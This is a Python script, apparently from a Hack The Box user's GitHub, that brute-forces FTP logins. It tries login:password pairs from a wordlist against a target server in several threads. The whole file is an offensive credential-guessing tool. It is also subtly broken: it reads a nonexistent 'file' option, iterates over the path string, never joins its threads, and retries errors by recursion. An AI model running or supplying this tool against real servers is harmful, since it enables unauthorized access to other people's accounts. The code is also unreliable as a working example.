import ftplib
import argparse
import threading as Th


def creds():
    print("ftprc")
    print("---------------------\n")
    print("Author: Kirk")
    print("HTB Profile: https://www.hackthebox.eu/home/users/profile/188681")
    print("GitHub: https://github.com/haqgg\n\n")


def parser():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--server", dest="server")
    parser.add_argument("-f", "--file", dest="filepass")
    parser.add_argument("-p", "--port", dest="port", type=int, default=21)
    parser.add_argument("-th", "--threads", dest="th_num", type=int, default=5)
    options = parser.parse_args()

    return options


# connect to a server
def connect(login, password, port, server):
    try:
        ft = ftplib.FTP()
        ft.connect(host=server, port=port)
        ft.login(user=login, passwd=password)
        ft.quit()
        print("\n[+] DONE!\n\t Login - ", login + "\n", "\tPassword -", password)
        exit()
    except ftplib.error_perm:
        print(login, ":", password, "- [-]")

    except ConnectionRefusedError:
        print("[E] The destination computer rejected the connection request.")

    except TimeoutError:
        print("[E] The program can't connect to the server!")

    except Exception as e:
        print("[E] ", e)
        connect(login, password, port, server)


def parse(port, filepass, server):
    for line in filepass:
        login = line.split(":")[0]
        password = line.split(":")[1].replace("\n", "")
        connect(login, password, port, server)


# Threads
def main(server, port, th_num, filepass):
    print("[I] START")
    th = (Th.Thread(target=parse, args=[port, filepass, server]) for i in range(th_num))
    for t in th:
        t.start()
    for t in th:
        t.join()


try:
    options = parser()
    server = options.server
    port = options.port
    th_num = options.th_num
    filepass = options.file
    main(server, port, th_num, filepass)

except KeyboardInterrupt:
    print("\n\n[-] Detected Ctrl + C ... Program Existed")
    exit()

except Exception as e:
    with open("log.txt", "w") as fileerror:
        fileerror.write(str(e))
    print("\n\n[-] Some problem, check log.txt")
    exit()
